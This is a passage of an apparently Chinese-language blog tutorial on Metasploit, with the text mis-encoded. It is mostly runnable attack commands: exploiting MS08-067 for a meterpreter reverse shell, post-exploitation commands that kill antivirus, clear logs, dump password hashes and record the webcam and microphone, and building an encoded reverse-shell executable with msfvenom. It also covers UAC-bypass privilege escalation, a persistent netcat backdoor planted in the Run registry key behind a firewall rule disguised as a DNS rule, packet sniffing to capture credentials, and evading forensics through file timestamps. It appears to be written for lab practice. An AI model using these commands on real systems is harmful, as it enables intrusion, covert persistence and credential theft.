ms08_067</span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.1.200</span><br><span class="line">set target 34</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">run -j</span><br><span class="line">sessions -l</span><br><span class="line">sessions 1</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°meterpreter shell</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200626133358053.png" class><p>2.meterpreter shellä¸‹çš„å¸¸ç”¨å‘½ä»¤ï¼Œåœ¨meterpreter shellä¸‹å¯ä»¥ä½¿ç”¨Linuxå‘½ä»¤ä¸Windowså‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">help # å¸®åŠ©</span><br><span class="line">background # è¿”å›msfconlseï¼Œå¹¶ä¿å­˜session</span><br><span class="line">dir,pwd,cat,ls,mkdir,rmdir, edit,lcd,lpwdç­‰</span><br><span class="line">bgrun killav # æ€æ­»æ€ç—…æ¯’è½¯ä»¶</span><br><span class="line">bgrun vnc # ç›‘æ§</span><br><span class="line">clearev # æ¸…é™¤æ—¥å¿—</span><br><span class="line">download # ä¸‹è½½æ–‡ä»¶ download boot.ini</span><br><span class="line">upload # ä¸Šä¼  ä¾‹å¦‚ï¼šupload /usr/share/windows-binaries/nc.exe c:</span><br><span class="line">execute # æ‰§è¡Œ ä¾‹å¦‚ï¼šexecute -f cmd.exe -i -H -fä¸ºè¿è¡Œå“ªä¸ªç¨‹åº -iä¸ºäº¤äº’ -Hä¸ºéšè—</span><br><span class="line">getuid # æŸ¥çœ‹å½“å‰ç”¨æˆ·</span><br><span class="line">getsystem # ææƒåˆ°system</span><br><span class="line">getprivs # æŸ¥çœ‹æœ‰å“ªäº›æƒé™</span><br><span class="line">getproxy # è·å–ä»£ç†</span><br><span class="line">getpid # è·å–è¿›ç¨‹å·</span><br><span class="line">migrate 1548 # è¿ç§»è¿›ç¨‹</span><br><span class="line">hashdump # è·å–ç”¨æˆ·çš„å“ˆå¸Œå€¼</span><br><span class="line">sysinfo # æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</span><br><span class="line">reboot</span><br><span class="line">shutdown</span><br><span class="line">shell # è·å–shell</span><br><span class="line">show_mount # æŸ¥çœ‹æŒ‚è½½ç¡¬ç›˜</span><br><span class="line">search -f ein.ini # æŸ¥æ‰¾æ–‡ä»¶</span><br><span class="line">arp</span><br><span class="line">netstat</span><br><span class="line">ipcofnig</span><br><span class="line">ifconfig</span><br><span class="line">route</span><br><span class="line">idletime # æŸ¥çœ‹åœæ­¢æ“ä½œçš„æ—¶é—´</span><br><span class="line">resource -r æ–‡ä»¶ # è°ƒç”¨èµ„æºæ–‡ä»¶</span><br><span class="line">record_mic # éº¦å…‹é£</span><br><span class="line">webcam_list # æ‘„åƒå¤´</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="äº”ã€-msfcli"><a href="#äº”ã€-msfcli" class="headerlink" title="äº”ã€ msfcli"></a>äº”ã€ msfcli</h2><p>å·²è¢«msfconsole -xä»£æ›¿ï¼Œä¸å¥½ç©</p><p>ä¾‹å­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi;</span><br><span class="line">set rhosts 192.168.1.200;</span><br><span class="line">set target 34;</span><br><span class="line">set payload windows/meterpreter/reverse_tcp;</span><br><span class="line">set lhost 192.168.1.6;</span><br><span class="line">run -j&quot;</span><br></pre></td></tr></table></figure><hr><hr><hr><hr><h1 id="0x02-MSFä¿¡æ¯æ”¶é›†"><a href="#0x02-MSFä¿¡æ¯æ”¶é›†" class="headerlink" title="0x02.MSFä¿¡æ¯æ”¶é›†"></a>0x02.MSFä¿¡æ¯æ”¶é›†</h1><h2 id="ä¸€ã€å†…ç½®å¤–éƒ¨å·¥å…·"><a href="#ä¸€ã€å†…ç½®å¤–éƒ¨å·¥å…·" class="headerlink" title="ä¸€ã€å†…ç½®å¤–éƒ¨å·¥å…·"></a>ä¸€ã€å†…ç½®å¤–éƒ¨å·¥å…·</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_nmap 192.168.1.0/24</span><br></pre></td></tr></table></figure><h2 id="äºŒã€auxiliaryæ¨¡å—"><a href="#äºŒã€auxiliaryæ¨¡å—" class="headerlink" title="äºŒã€auxiliaryæ¨¡å—"></a>äºŒã€auxiliaryæ¨¡å—</h2><h3 id="ä¾‹ä¸€ï¼Œarpä¸»æœºæ‰«æ"><a href="#ä¾‹ä¸€ï¼Œarpä¸»æœºæ‰«æ" class="headerlink" title="ä¾‹ä¸€ï¼Œarpä¸»æœºæ‰«æ"></a>ä¾‹ä¸€ï¼Œarpä¸»æœºæ‰«æ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search arp</span><br><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">show options</span><br><span class="line">set interface eth0 # è®¾ç½®ç½‘å¡</span><br><span class="line">set rhosts 192.168.1.0/24 # è®¾ç½®ç½‘æ®µ</span><br><span class="line">set threads 20 # è®¾ç½®çº¿ç¨‹æ•°</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="ä¾‹äºŒï¼Œç«¯å£æ‰«æ"><a href="#ä¾‹äºŒï¼Œç«¯å£æ‰«æ" class="headerlink" title="ä¾‹äºŒï¼Œç«¯å£æ‰«æ"></a>ä¾‹äºŒï¼Œç«¯å£æ‰«æ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search portscan</span><br><span class="line">set interface eth0</span><br><span class="line">set ports 80</span><br><span class="line">set rhosts 192.168.1.0/24</span><br><span class="line">set threads 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="ä¾‹ä¸‰ï¼ŒUDPæ‰«æ"><a href="#ä¾‹ä¸‰ï¼ŒUDPæ‰«æ" class="headerlink" title="ä¾‹ä¸‰ï¼ŒUDPæ‰«æ"></a>ä¾‹ä¸‰ï¼ŒUDPæ‰«æ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure><h3 id="ä¾‹å››ï¼ŒSMTPæ‰«æ"><a href="#ä¾‹å››ï¼ŒSMTPæ‰«æ" class="headerlink" title="ä¾‹å››ï¼ŒSMTPæ‰«æ"></a>ä¾‹å››ï¼ŒSMTPæ‰«æ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/default/snmpd #ä¿®æ”¹ä¾¦å¬åœ°å€  0.0.0.0</span><br><span class="line">use auxiliary/scanner/snmp/snmp_login</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enumusers ï¼ˆwindowsï¼‰</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enumshares ï¼ˆwindowsï¼‰</span><br></pre></td></tr></table></figure><h3 id="ä¾‹äº”ï¼ŒSMBæ‰«æ"><a href="#ä¾‹äº”ï¼ŒSMBæ‰«æ" class="headerlink" title="ä¾‹äº”ï¼ŒSMBæ‰«æ"></a>ä¾‹äº”ï¼ŒSMBæ‰«æ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ç‰ˆæœ¬æ‰«æ</span><br><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"></span><br><span class="line">æ‰«æå‘½ä»¤ç®¡é“ï¼Œåˆ¤æ–­SMBæœåŠ¡ç±»å‹ï¼ˆè´¦å·ï¼Œå¯†ç ï¼‰</span><br><span class="line">use auxiliary/scanner/smb/pipe_auditor</span><br><span class="line"></span><br><span class="line">æ‰«æé€šè¿‡SMBç®¡é“å¯ä»¥è®¿é—®çš„RCERPCæœåŠ¡</span><br><span class="line">use auxiliary/scanner/smb/pipe_dcerpc_auditor</span><br><span class="line"></span><br><span class="line">SMBæšä¸¾å…±äº«</span><br><span class="line">use auxiliary/scanner/smb/smb_enumshares</span><br><span class="line"></span><br><span class="line">SMBç”¨æˆ·æšä¸¾</span><br><span class="line">use auxiliary/scanner/smb/smb_enumusers</span><br><span class="line"></span><br><span class="line">SMB SIDï¼ˆRIDï¼‰æšä¸¾</span><br><span class="line">use auxiliary/scanner/smb/smb_lookupsid</span><br></pre></td></tr></table></figure><h3 id="ä¾‹å…­ï¼ŒSSHæ‰«æ"><a href="#ä¾‹å…­ï¼ŒSSHæ‰«æ" class="headerlink" title="ä¾‹å…­ï¼ŒSSHæ‰«æ"></a>ä¾‹å…­ï¼ŒSSHæ‰«æ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SSHç‰ˆæœ¬æ‰«æ</span><br><span class="line">use auxiliary/scanner/ssh/ssh_versio</span><br><span class="line"></span><br><span class="line">SSHå¯†ç çˆ†ç ´</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">set userpass_file /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</span><br><span class="line"></span><br><span class="line">SSHå…¬é’¥ç™»å…¥</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login_pubkey</span><br></pre></td></tr></table></figure><h1 id="0x03-MSFæ¼æ´æ‰«æ"><a href="#0x03-MSFæ¼æ´æ‰«æ" class="headerlink" title="0x03.MSFæ¼æ´æ‰«æ"></a>0x03.MSFæ¼æ´æ‰«æ</h1><h2 id="å®éªŒæ¡ˆä¾‹"><a href="#å®éªŒæ¡ˆä¾‹" class="headerlink" title="å®éªŒæ¡ˆä¾‹"></a>å®éªŒæ¡ˆä¾‹</h2><h3 id="ä¾‹ä¸€ï¼Œvncå¯†ç ç ´è§£"><a href="#ä¾‹ä¸€ï¼Œvncå¯†ç ç ´è§£" class="headerlink" title="ä¾‹ä¸€ï¼Œvncå¯†ç ç ´è§£"></a>ä¾‹ä¸€ï¼Œvncå¯†ç ç ´è§£</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/vnc/vnc_login</span><br><span class="line">threads 30</span><br><span class="line">set BlANK_PASSWORDS yes</span><br><span class="line">set rhosts 192.168.1.5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="ä¾‹äºŒï¼Œvncæ— å¯†ç è®¿é—®"><a href="#ä¾‹äºŒï¼Œvncæ— å¯†ç è®¿é—®" class="headerlink" title="ä¾‹äºŒï¼Œvncæ— å¯†ç è®¿é—®"></a>ä¾‹äºŒï¼Œvncæ— å¯†ç è®¿é—®</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/vnc/vnc_none_auth</span><br><span class="line">set rhosts 192.168.1.5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="ä¾‹ä¸‰ï¼ŒRDPè¿œç¨‹æ¡Œé¢æ¼æ´"><a href="#ä¾‹ä¸‰ï¼ŒRDPè¿œç¨‹æ¡Œé¢æ¼æ´" class="headerlink" title="ä¾‹ä¸‰ï¼ŒRDPè¿œç¨‹æ¡Œé¢æ¼æ´"></a>ä¾‹ä¸‰ï¼ŒRDPè¿œç¨‹æ¡Œé¢æ¼æ´</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/rdp/ms12_020_check # æ— DOSæ”»å‡»</span><br><span class="line">set rhosts 192.168.1.200</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary/dos/windows/rdp/ms12_020_maxchannelids  # DOSæ”»å‡»ï¼Œè“å±å…³æœº</span><br></pre></td></tr></table></figure><h3 id="ä¾‹å››ï¼Œæ˜¾ç¤ºç›®å½•åŠæ–‡ä»¶"><a href="#ä¾‹å››ï¼Œæ˜¾ç¤ºç›®å½•åŠæ–‡ä»¶" class="headerlink" title="ä¾‹å››ï¼Œæ˜¾ç¤ºç›®å½•åŠæ–‡ä»¶"></a>ä¾‹å››ï¼Œæ˜¾ç¤ºç›®å½•åŠæ–‡ä»¶</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/files_dir</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="ä¾‹äº”ï¼ŒWebDAV-Unicodeç¼–ç èº«ä»½éªŒè¯ç»•è¿‡"><a href="#ä¾‹äº”ï¼ŒWebDAV-Unicodeç¼–ç èº«ä»½éªŒè¯ç»•è¿‡" class="headerlink" title="ä¾‹äº”ï¼ŒWebDAV Unicodeç¼–ç èº«ä»½éªŒè¯ç»•è¿‡"></a>ä¾‹äº”ï¼ŒWebDAV Unicodeç¼–ç èº«ä»½éªŒè¯ç»•è¿‡</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/dir_webdav_unicode_bypass</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="ä¾‹å…­ï¼Œwmap"><a href="#ä¾‹å…­ï¼Œwmap" class="headerlink" title="ä¾‹å…­ï¼Œwmap"></a>ä¾‹å…­ï¼Œwmap</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é¦–å…ˆéœ€è¦load wmap</span><br><span class="line">æ ¹æ®sqlmapå·¥ä½œæ¨¡å¼å¼€å‘</span><br></pre></td></tr></table></figure><h1 id="0x04-MSFå®¢æˆ·ç«¯æ¸—é€"><a href="#0x04-MSFå®¢æˆ·ç«¯æ¸—é€" class="headerlink" title="0x04.MSFå®¢æˆ·ç«¯æ¸—é€"></a>0x04.MSFå®¢æˆ·ç«¯æ¸—é€</h1><h2 id="å®éªŒæ¡ˆä¾‹-1"><a href="#å®éªŒæ¡ˆä¾‹-1" class="headerlink" title="å®éªŒæ¡ˆä¾‹"></a>å®éªŒæ¡ˆä¾‹</h2><h3 id="æ¡ˆä¾‹1"><a href="#æ¡ˆä¾‹1" class="headerlink" title="æ¡ˆä¾‹1"></a>æ¡ˆä¾‹1</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp lhost=192.168.1.6 lport=4444 -b &#x27;\x00\xff&#x27; -e x86/shikata_ga_nai -i 5 -f exe -o what.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/shell/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h1 id="0x05-åæ¸—é€æµ‹è¯•"><a href="#0x05-åæ¸—é€æµ‹è¯•" class="headerlink" title="0x05.åæ¸—é€æµ‹è¯•"></a>0x05.åæ¸—é€æµ‹è¯•</h1><h2 id="å®éªŒæ¡ˆä¾‹-2"><a href="#å®éªŒæ¡ˆä¾‹-2" class="headerlink" title="å®éªŒæ¡ˆä¾‹"></a>å®éªŒæ¡ˆä¾‹</h2><h3 id="ææƒï¼Œæ¡ˆä¾‹ä¸€"><a href="#ææƒï¼Œæ¡ˆä¾‹ä¸€" class="headerlink" title="ææƒï¼Œæ¡ˆä¾‹ä¸€"></a>ææƒï¼Œæ¡ˆä¾‹ä¸€</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp</span><br><span class="line">LHOST=192.168.1.6 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o</span><br><span class="line">1.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">exploit -j</span><br><span class="line">è¿è¡Œ1.exe</span><br><span class="line"></span><br><span class="line">å¾—åˆ°LLunaç”¨æˆ·æƒé™</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: L-CD1028181A2B4\Lluna</span><br><span class="line"></span><br><span class="line">ææƒ</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">åŸºäºsessionææƒ(UACå…è®¸)</span><br><span class="line">background</span><br><span class="line">use exploit/windows/local/ask</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set filename winupdate.exe</span><br><span class="line">set session 1</span><br><span class="line">ç‚¹å‡»ç¡®å®šget shell</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: L-CD1028181A2B4\Lluna</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br><span class="line">ç»•è¿‡UACææƒï¼Œä¼šå‡ºç°Already in elevated stateï¼ˆå·²ç»å¤„äºæå‡çŠ¶æ€ï¼‰</span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set session 1</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨DDLåŠ¨æ€é“¾æ¥åº“ç»•è¿‡</span><br><span class="line">use exploit/windows/local/bypassuac_injection</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨æ¼æ´ææƒ</span><br><span class="line">use exploit/windows/local/ms13_053_schlamperei</span><br></pre></td></tr></table></figure><h3 id="æ¡ˆä¾‹äºŒï¼Œä½¿ç”¨æ³¨å†Œè¡¨æ·»åŠ NCåé—¨æœåŠ¡"><a href="#æ¡ˆä¾‹äºŒï¼Œä½¿ç”¨æ³¨å†Œè¡¨æ·»åŠ NCåé—¨æœåŠ¡" class="headerlink" title="æ¡ˆä¾‹äºŒï¼Œä½¿ç”¨æ³¨å†Œè¡¨æ·»åŠ NCåé—¨æœåŠ¡"></a>æ¡ˆä¾‹äºŒï¼Œä½¿ç”¨æ³¨å†Œè¡¨æ·»åŠ NCåé—¨æœåŠ¡</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32(ä¸Šä¼ nc)</span><br><span class="line">æŸ¥çœ‹é”®å€¼å¯¹</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line">å¢åŠ é”®å€¼å¯¹</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#x27;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#x27;</span><br><span class="line"></span><br><span class="line">å†æ¬¡æŸ¥çœ‹</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</span><br><span class="line"></span><br><span class="line">æ‰“å¼€ä¸€ä¸ªéšå¼shellï¼Œå¹¶æŸ¥çœ‹é˜²ç«å¢™</span><br><span class="line">execute -f cmd -i -H</span><br><span class="line">netsh firewall show opmode</span><br><span class="line"></span><br><span class="line">å¦‚æœå¼€å¯åˆ™æ·»åŠ æ”¾è¡Œç­–ç•¥</span><br><span class="line">netsh firewall add portopening TCP 444 &quot;Core Networking - DNS (UDP-Out) - fjy&quot; ENABLE ALL</span><br><span class="line">(Core Networking - DNS (UDP-Out)ä¸ºç³»ç»Ÿè‡ªå¸¦è§„åˆ™ç”¨äºä¼ªè£…)</span><br><span class="line"></span><br><span class="line">é‡å¯</span><br><span class="line">shutdown -r -t 0</span><br><span class="line"></span><br><span class="line">è¿æ¥</span><br><span class="line">nc 192.168.1.200 444</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200705201304290.png" class><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200705202016725.png" class><h3 id="æ¡ˆä¾‹ä¸‰ã€æŠ“åŒ…"><a href="#æ¡ˆä¾‹ä¸‰ã€æŠ“åŒ…" class="headerlink" title="æ¡ˆä¾‹ä¸‰ã€æŠ“åŒ…"></a>æ¡ˆä¾‹ä¸‰ã€æŠ“åŒ…</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">åœ¨è·å–åˆ°meterpreter shellçš„æƒ…å†µä¸‹</span><br><span class="line">meterpreter &gt; load sniffer    # å¯¼å…¥sniffer</span><br><span class="line">meterpreter &gt; sniffer_start 3 # é€‰æ‹©ç½‘å¡è¿›è¡ŒæŠ“åŒ…ï¼ŒæŠ“åŒ…æ–¹æ³•ä¸ºåœ¨å†…å­˜ä¸­ç¼“å­˜åŒºå—å¾ªç¯å­˜å‚¨æŠ“åŒ…ï¼Œé»˜è®¤50000ä¸ªåŒ…ï¼Œä¸å†™ç¡¬ç›˜ä¸­ï¼Œå¹¶ä¸”æ™ºèƒ½è¿‡æ»¤meterpreteræµé‡ï¼Œä¼ è¾“è¿‡ç¨‹ä½¿ç”¨SSL/TLSåŠ å¯†ã€‚</span><br><span class="line">sniffer_dump 3 text.cap # ä¸‹è½½æŠ“åˆ°çš„åŒ…</span><br><span class="line"></span><br><span class="line">æŠ“åˆ°çš„åŒ…å¯ä»¥ä½¿ç”¨wiresharkè¿›è¡Œåˆ†æï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨MSFè‡ªå¸¦è§£ç è¿›è¡Œè§£ç </span><br><span class="line">use auxiliary/sniffer/psnuffle</span><br><span class="line">set PCAPFILE text.cap</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706121725585.png" class><p>å¯ä»¥çœ‹åˆ°ç”¨æˆ·åä¸å¯†ç </p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706121809730.png" class><h3 id="æ¡ˆä¾‹å››ã€æ–‡ä»¶æœç´¢"><a href="#æ¡ˆä¾‹å››ã€æ–‡ä»¶æœç´¢" class="headerlink" title="æ¡ˆä¾‹å››ã€æ–‡ä»¶æœç´¢"></a>æ¡ˆä¾‹å››ã€æ–‡ä»¶æœç´¢</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search -f *.ini</span><br><span class="line">search -d C:\\Users\ and\ settings\\administrator\\desktop\\ -f *.docx</span><br></pre></td></tr></table></figure><h3 id="æ¡ˆä¾‹äº”ã€æ—¶é—´å–è¯åˆ†æ"><a href="#æ¡ˆä¾‹äº”ã€æ—¶é—´å–è¯åˆ†æ" class="headerlink" title="æ¡ˆä¾‹äº”ã€æ—¶é—´å–è¯åˆ†æ"></a>æ¡ˆä¾‹äº”ã€æ—¶é—´å–è¯åˆ†æ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">æ–‡ä»¶ç³»ç»Ÿè®¿é—®ä¼šç•™ä¸‹ç—•è¿¹ï¼Œç”µå­å–è¯é‡ç‚¹å…³æ³¨ã€‚</span><br><span class="line">æ¸—é€æµ‹è¯•è€…ä¸æ”»å‡»è€…å¾€å¾€å¸Œæœ›é”€æ¯æ–‡ä»¶ç³»ç»Ÿçš„è®¿é—®ç—•è¿¹ã€‚</span><br><span class="line">æœ€å¥½çš„é¿å…è¢«æ–‡ä»¶å–è¯å°±æ˜¯ä¸è¦è§¦ç¢°æ–‡ä»¶ç³»ç»Ÿã€‚</span><br><span class="line">meterpreterçš„ä¼˜åŠ¿åœ¨äºå®Œå…¨åŸºäºå†…å­˜ã€‚</span><br><span class="line">MAC æ—¶é—´ï¼ˆModified / Accessed / Changedï¼‰</span><br><span class="line">Mä¸ºæ–‡ä»¶ä¿®æ”¹æ—¶é—´ï¼ŒAä¸ºæ–‡ä»¶çš„è®¿é—®æ—¶é—´ï¼ŒCä¸ºæ–‡ä»¶æƒé™çš„ä¿®æ”¹æ—¶é—´</span><br><span class="line"></span><br><span class="line">åœ¨ç³»ç»Ÿä¸‹ä¿®æ”¹æ—¶é—´ï¼š</span><br><span class="line">ls -l --time=atime/ctime 1.txt # 